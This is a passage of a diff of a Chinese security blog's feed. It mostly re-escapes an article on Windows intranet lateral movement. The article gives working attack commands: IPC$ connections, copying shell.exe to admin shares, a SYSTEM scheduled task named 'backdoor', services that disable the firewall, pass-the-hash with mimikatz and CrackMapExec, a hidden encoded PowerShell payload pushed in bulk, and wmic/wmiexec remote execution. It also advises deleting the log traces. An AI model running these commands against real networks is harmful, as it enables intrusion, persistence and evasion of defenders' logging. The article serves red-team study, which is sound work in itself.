+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classFileIsExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;已PR到：&lt;a href=&#34;https://github.com/c0ny1/java-memshell-scanner&#34;&gt;java-memshell-scanner&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。&lt;/p&gt;
@@ -806,7 +926,7 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
             <title type="text">内网横向移动方法</title>
             <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95/" />
             <id>https://blog.wh1sper.com/posts/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95/</id>
-            <updated>2022-10-30T10:47:31&#43;08:00</updated>
+            <updated>2022-10-30T10:47:32&#43;08:00</updated>
             <published>2022-06-01T18:08:48&#43;08:00</published>
             <author>
                     <name>wh1sper</name>
@@ -826,9 +946,9 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;p&gt;&lt;code&gt;IPC$(Internet Process Connection)&lt;/code&gt;是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。&lt;/p&gt;
 &lt;p&gt;利用&lt;code&gt;IPC$&lt;/code&gt;,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。&lt;/p&gt;
 &lt;p&gt;命令：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\192.168.10.2\ipc$ /user:&amp;quot;username&amp;quot; &amp;quot;password&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\192.168.10.2\ipc$ /user:&amp;#34;username&amp;#34; &amp;#34;password&amp;#34;
 //建立ipc连接
-net use \\192.168.10.2 /u:domainname\username &amp;quot;password&amp;quot;
+net use \\192.168.10.2 /u:domainname\username &amp;#34;password&amp;#34;
 // 域中建立ipc连接
 net use \\192.168.10.2 /de /y 
 // 删除ipc连接(使用完之后记得删除)
@@ -841,7 +961,7 @@ copy shell.exe \\192.168.10.2\C$\windows\temp\
 //复制文件到目标目录
 copy \\192.168.10.2\C$\windows\temp\hash.txt 
 //下载文件到当前目录
-net use z: \\192.168.10.2\c$ &amp;quot;密码&amp;quot; /user:&amp;quot;用户名&amp;quot;  
+net use z: \\192.168.10.2\c$ &amp;#34;密码&amp;#34; /user:&amp;#34;用户名&amp;#34;  
 //将对方的c盘映射为自己的z盘
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ipc常见错误号&#34;&gt;IPC常见错误号&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；
@@ -864,11 +984,11 @@ net use z: \\192.168.10.2\c$ &amp;quot;密码&amp;quot; /user:&amp;quot;用户�
 &lt;p&gt;在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt（记得删）&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /create /s 192.168.10.2 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
-// 创建一个名称为&amp;quot;backdoor&amp;quot;的计划任务。该计划任务每分钟启动一次，启动程序为c:\shell.exe，启动权限为system
+// 创建一个名称为&amp;#34;backdoor&amp;#34;的计划任务。该计划任务每分钟启动一次，启动程序为c:\shell.exe，启动权限为system
 schtasks /run /s 192.168.10.2 /i /tn backdoor
 // i：忽略任何限制立即运行任务
-schtasks /delete /s 192.168.10.2 /tn &amp;quot;backdoor&amp;quot; /f
-// 强制删除名称为&amp;quot;backdoor&amp;quot;计划任务（记得删）
+schtasks /delete /s 192.168.10.2 /tn &amp;#34;backdoor&amp;#34; /f
+// 强制删除名称为&amp;#34;backdoor&amp;#34;计划任务（记得删）
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在没有建立ipc连接时，要加上/u和/p参数分别设置用户名(域中为&lt;code&gt;域\域用户&lt;/code&gt;)和密码。
 如果因为权限或组策略设置等原因报错拒绝访问，要加上/u和/p参数分别设置高权限用户名和密码。&lt;/p&gt;
 &lt;p&gt;Vista 和 Server 2008 之前：&lt;/p&gt;
@@ -884,7 +1004,7 @@ at \\192.168.10.2 1 /delete //删除ID为1的计划任务
 &lt;p&gt;2.拷贝木马到目标机器&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;copy shell.exe \\192.168.10.2\C$\windows\temp\
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.在目标主机DC上创建一个名称为“backdoor”的服务。命令如下：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\[主机名 or IP] create [servicename] binpath= &amp;quot;[path]&amp;quot;   
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\[主机名 or IP] create [servicename] binpath= &amp;#34;[path]&amp;#34;   
 //创建计划任务启动程序
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意这里的格式，“=” 后面是必须空一格的，否则会出现错误。&lt;/p&gt;
 &lt;p&gt;4.立即启动该服务：&lt;/p&gt;
@@ -892,7 +1012,7 @@ at \\192.168.10.2 1 /delete //删除ID为1的计划任务
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.删除刚才创建的服务&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\192.168.10.2 delete bindshell
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们还可以通过设置服务来关闭防火墙：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &amp;quot;netsh advfirewall set allprofiles state off&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &amp;#34;netsh advfirewall set allprofiles state off&amp;#34;
 sc \\WIN-ENS2VR5TR3N start unablefirewall
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过smb服务横向移动&#34;&gt;通过smb服务横向移动&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -973,9 +1093,9 @@ sekurlsa::pth /user:administrator /domain:workgroup /ntlm:852a844adfce18f66009b4
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量传递hash:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量执行命令:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de  -x &amp;quot;whoami&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.73.147.90 10.73.147.88 -u administrator -H 852a844adfce18f66009b4f14e0a98de  -x &amp;#34;whoami&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者执行powershell,我们可以通过CS的powershell command然后粘贴生成的payload.txt中的内容直接-x执行即可批量上马。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &amp;quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &amp;#34;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wmi-横向&#34;&gt;WMI 横向&lt;/h2&gt;
 &lt;p&gt;WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。&lt;/p&gt;
 &lt;blockquote&gt;
@@ -988,29 +1108,28 @@ sekurlsa::pth /user:administrator /domain:workgroup /ntlm:852a844adfce18f66009b4
 &lt;p&gt;3、知道目标机的账户密码。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;执行命令：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:191.168.52.136 /user:xxxx /password:xxxxx  process call create &amp;quot;cmd.exe /c ipconfig&amp;gt;d:\result.txt&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic /node:191.168.52.136 /user:xxxx /password:xxxxx  process call create &amp;#34;cmd.exe /c ipconfig&amp;gt;d:\result.txt&amp;#34;
 //无需上传第三方软件，利用系统内置程序,单命令执行，执行后无结果回显
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wmi常用命令&#34;&gt;WMI常用命令&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/246440.html&#34;&gt;https://www.freebuf.com/articles/246440.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;文件管理&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic fsdir where &amp;quot;drive=&#39;c:&#39; and filename=&#39;whoami&#39;&amp;quot; list
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic fsdir where &amp;#34;drive=&amp;#39;c:&amp;#39; and filename=&amp;#39;whoami&amp;#39;&amp;#34; list
 
-wmic fsdir &amp;quot;c:\\test&amp;quot; call delete
+wmic fsdir &amp;#34;c:\\test&amp;#34; call delete
 //删除C盘下的test目录，注意“\”要进行一下转义
 
 wmic process where “NOT ExecutablePath LIKE ‘%Windows%’” GET ExecutablePath
 //枚举出整个系统中的所有可执行文件
 
-for /f &amp;quot;skip=1 tokens=1*&amp;quot; %i in (&#39;wmic datafile where &amp;quot;FileName=&#39;qq&#39; and extension=&#39;exe&#39;&amp;quot; get drive^,path&#39;) do (set &amp;quot;qPath=%i%j&amp;quot;&amp;amp;@echo %qPath:~0,-3%)
+for /f &amp;#34;skip=1 tokens=1*&amp;#34; %i in (&amp;#39;wmic datafile where &amp;#34;FileName=&amp;#39;qq&amp;#39; and extension=&amp;#39;exe&amp;#39;&amp;#34; get drive^,path&amp;#39;) do (set &amp;#34;qPath=%i%j&amp;#34;&amp;amp;@echo %qPath:~0,-3%)
 //wmic 全盘搜索某文件并获取该文件所在目录
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;环境变量&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic environment get Description, VariableValue
 
-wmic environment where &amp;quot;name=&#39;temp&#39;&amp;quot; get UserName,VariableValue
+wmic environment where &amp;#34;name=&amp;#39;temp&amp;#39;&amp;#34; get UserName,VariableValue
 //环境变量，获取temp环境变量
 
-wmic environment where &amp;quot;name=&#39;path&#39; and username=&#39;&amp;lt;system&amp;gt;&#39;&amp;quot; set VariableValue=&amp;quot;%path%;c:\whoami&amp;quot;
+wmic environment where &amp;#34;name=&amp;#39;path&amp;#39; and username=&amp;#39;&amp;lt;system&amp;gt;&amp;#39;&amp;#34; set VariableValue=&amp;#34;%path%;c:\whoami&amp;#34;
 //更改PATH环境变量值，新增c:\whoami
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进程管理&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic process list brief
@@ -1019,27 +1138,26 @@ wmic environment where &amp;quot;name=&#39;path&#39; and username=&#39;&amp;lt;s
 wmic process get processid,name,executablepath 
 //Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态
 
-wmic process where name=&amp;quot;vmtoolsd.exe&amp;quot; get executablepath
+wmic process where name=&amp;#34;vmtoolsd.exe&amp;#34; get executablepath
 //获取指定进程可执行文件的路径
 
-wmic process call create &amp;quot;C:\windows\system32\notepad.exe&amp;quot;
+wmic process call create &amp;#34;C:\windows\system32\notepad.exe&amp;#34;
 //创建进程
 
-wmic process call create &amp;quot;cmd.exe /c &#39;ipconfig&#39;&amp;quot;
-wmic process call create &amp;quot;shutdown.exe -r -f -t 60&amp;quot;
+wmic process call create &amp;#34;cmd.exe /c &amp;#39;ipconfig&amp;#39;&amp;#34;
+wmic process call create &amp;#34;shutdown.exe -r -f -t 60&amp;#34;
 //根据系统命令创建进程
 
-wmic process where name=&amp;quot;notepad.exe&amp;quot; delete
-wmic process where pid=&amp;quot;244&amp;quot; delete 
+wmic process where name=&amp;#34;notepad.exe&amp;#34; delete
+wmic process where pid=&amp;#34;244&amp;#34; delete 
 //删除进程
-
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户账户管理&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic useraccount
 wmic useraccount list brief
 
-wmic useraccount where &amp;quot;name=&#39;%UserName%&#39;&amp;quot; call rename newUserName
+wmic useraccount where &amp;#34;name=&amp;#39;%UserName%&amp;#39;&amp;#34; call rename newUserName
 // 更改当前用户名
-wmic useraccount where &amp;quot;name=&#39;Administrator&#39;&amp;quot; call Rename admin
+wmic useraccount where &amp;#34;name=&amp;#39;Administrator&amp;#39;&amp;#34; call Rename admin
 // 更改指定用户名
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取补丁信息&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wmic qfe list brief
@@ -1056,9 +1174,9 @@ wmic qfe get Caption,Description,HotFixID,IntsalledOn
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
-// wmic /node:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[full machine name]&amp;#34;&lt;/span&gt; /USER:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[domain]\[username]&amp;#34;&lt;/span&gt; PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// wmic /node:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[full machine name]&amp;#34;&lt;/span&gt; /USER:&lt;span class=&#34;s2&#34;&gt;&amp;#34;[domain]\[username]&amp;#34;&lt;/span&gt; PATH win32_terminalservicesetting WHERE (__Class!=&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) CALL SetAllowTSConnections 1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;共享管理&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1075,17 +1193,17 @@ wmic qfe get Caption,Description,HotFixID,IntsalledOn
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmic share list brief
-wmic share get name,path,status
-
-wmic share call create &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;TestShareName&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\whoami&amp;#34;&lt;/span&gt;,0
-&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;可使用 WMIC SHARE CALL Create /? 查看create后的参数类型&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-// 建立共享
-
-wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;name=&amp;#39;C$&amp;#39;&amp;#34;&lt;/span&gt; call delete
-wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&amp;#39;&amp;#34;&lt;/span&gt; delete
-// 删除共享
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic share list brief
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic share get name,path,status
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic share call create &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;TestShareName&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;c:\whoami&amp;#34;&lt;/span&gt;,0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;可使用 WMIC SHARE CALL Create /? 查看create后的参数类型&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// 建立共享
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;name=&amp;#39;C$&amp;#39;&amp;#34;&lt;/span&gt; call delete
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&amp;#39;&amp;#34;&lt;/span&gt; delete
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// 删除共享
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;wmiexec&#34;&gt;wmiexec&lt;/h3&gt;
 &lt;p&gt;要执行命令并回显请使用wmiexec.py，⽤445端口传回显：&lt;/p&gt;
@@ -1095,9 +1213,9 @@ wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&a
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;python wmiexec.py administrator:Liu78963@192.168.183.130
-// python wmiexec.py 用户名:密码@目标IP
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python wmiexec.py administrator:Liu78963@192.168.183.130
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// python wmiexec.py 用户名:密码@目标IP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;指定-hashes选项的话，则可进行哈希传递。&lt;/p&gt;
 &lt;p&gt;exe版本命令与wmiexec.py一模一样。在跳板机上上传wmiexec.exe并运行如下命令获取目标系统192.168.52.138的shell：&lt;/p&gt;
@@ -1106,8 +1224,8 @@ wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&a
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;wmiexec.exe administrator:Liu78963@192.168.183.130
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmiexec.exe administrator:Liu78963@192.168.183.130
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;wmiexecvbs&#34;&gt;wmiexec.vbs&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&#34;&gt;https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs&lt;/a&gt;&lt;/p&gt;
@@ -1128,11 +1246,11 @@ wmic share where &lt;span class=&#34;s2&#34;&gt;&amp;#34;path=&amp;#39;c:\test&a
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz sekurlsa::ekeys
-//获取用户的aes key
-sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-//注入aes key，成功后会返回一个cmd
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz sekurlsa::ekeys
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//获取用户的aes key
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//注入aes key，成功后会返回一个cmd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;ptt-票据传递&#34;&gt;PTT-票据传递&lt;/h2&gt;
 &lt;h3 id=&#34;ms14-068&#34;&gt;MS14-068&lt;/h3&gt;
@@ -1163,8 +1281,8 @@ sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&
